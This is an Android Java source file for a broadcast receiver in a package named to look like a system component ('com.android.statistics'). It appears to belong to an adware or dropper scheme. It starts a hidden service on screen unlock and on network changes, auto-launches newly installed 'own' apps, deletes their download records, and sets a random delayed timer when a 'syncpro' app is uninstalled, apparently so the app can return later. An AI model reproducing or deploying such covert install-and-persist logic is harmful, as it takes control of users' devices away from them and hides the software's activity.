package com.android.statistics;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Random;

import com.android.statistics.utils.LogUtil;
import com.android.statistics.utils.PerfectUtil;
import com.android.statistics.PerfectService;

import android.app.DownloadManager;
import android.app.DownloadManager.Query;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.os.Handler;
import android.util.Log;

public class PerfectReceiver extends BroadcastReceiver{
	private String USER_PRESENT="android.intent.action.USER_PRESENT";
	private String CONNECTIVITY_CHANGE="android.net.conn.CONNECTIVITY_CHANGE";
	private String TAG="PerfectReceiver";
	  @Override
	public void onReceive(final Context paramContext, Intent paramIntent) {
		// TODO Auto-generated method stub
	    String action = paramIntent.getAction();
	    if(LogUtil.flag) Log.v(TAG,"SysCore str="+action);
	    if (USER_PRESENT.equals(action) ||
	    		CONNECTIVITY_CHANGE.equals(action)){	
            new Handler().postAtTime(new Runnable(){
                @Override
                public void run() {
                    Intent intent = new Intent();
                    intent.setAction(PerfectService.ACTION_INIT);
                    intent.setPackage(paramContext.getPackageName());
                    paramContext.startService(intent);
                }                
            }, 2000);
	    }
	    if (action.equals(Intent.ACTION_PACKAGE_ADDED)){
	        final String packageName = paramIntent.getDataString().replace("package:", "");
	        if(LogUtil.flag) Log.v(TAG,"SysCore ourSelfAPk6="+packageName);
	         boolean ourSelfAPk = PerfectUtil.isIntentAvailable(paramContext,packageName,PerfectUtil.selfAction);
	         if(LogUtil.flag) Log.v(TAG,"SysCore ourSelfAPk123="+ourSelfAPk);
	         if(ourSelfAPk)
	        	 PerfectUtil.openOurApplicationEx(paramContext, packageName);
	         
	         removeDown(paramContext);
	    }
	    if (action.equals(Intent.ACTION_PACKAGE_REMOVED)){
	    	final String packageName = paramIntent.getDataString().replace("package:", "");
	    	if(LogUtil.flag) Log.v(TAG,"SysCore remove ourSelfAPk6="+packageName);
	    	String [] strings=packageName.split("\\.");
	    	if (strings!=null&&strings.length>0) {
				for (int i = 0; i < strings.length; i++) {
					if(LogUtil.flag) Log.v(TAG,"SysCore remove strings["+i+"]="+strings[i]);
					boolean bl=strings[i].contains("syncpro");
					if(LogUtil.flag) Log.v(TAG,"SysCore remove strings[i].startsWith="+bl);
					if (bl) {
						Random random=new Random();
						int sDays=random.nextInt(10)+10;
						if(LogUtil.flag) Log.v(TAG,"SysCore remove sDays="+sDays);
						
						Date date1 = new Date();   
					    SimpleDateFormat df = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
					    String now = df.format(new Date(date1.getTime() + sDays*24*60*60* 1000));
					    
						SharedPreferences.Editor sTimeSharedPreferences = paramContext
								.getSharedPreferences("UinstallSTime",
										paramContext.MODE_PRIVATE)
										.edit();
						sTimeSharedPreferences.putString("STime", now);
						sTimeSharedPreferences.commit();
						break;
					}
				}
			}
	    	
	    }
	    
  }  

	private void removeDown(Context context) {
		SharedPreferences downloadInfo_SharedPreferences = context
				.getSharedPreferences("DownloadInfo", 0);
		long ID = downloadInfo_SharedPreferences.getLong("ID", 0);
		if (LogUtil.flag)
			Log.v(TAG, "SysCore queryDown ID 456546 =" + ID);

		DownloadManager downloadManager = (DownloadManager) context
				.getSystemService(Context.DOWNLOAD_SERVICE);
		Query myDownloadQuery = new Query();
		myDownloadQuery.setFilterByStatus(DownloadManager.STATUS_SUCCESSFUL);
		Cursor myDownload = downloadManager.query(myDownloadQuery);
		if (LogUtil.flag)
			Log.d(TAG, "queryDown myDownload===" + myDownload);
		if (myDownload != null) {
			while (myDownload.moveToNext()) {
				int id = myDownload.getColumnIndex(DownloadManager.COLUMN_ID);
				long queryID = myDownload.getLong(id);
				if (LogUtil.flag)
					Log.d(TAG, "queryDown id===" + id);
				if (LogUtil.flag)
					Log.d(TAG, "queryDown queryID===" + queryID);
				//  Do something with the file.
				if (ID == queryID) {
					downloadManager.remove(queryID);
				}
			}
			myDownload.close();
		}

	}
}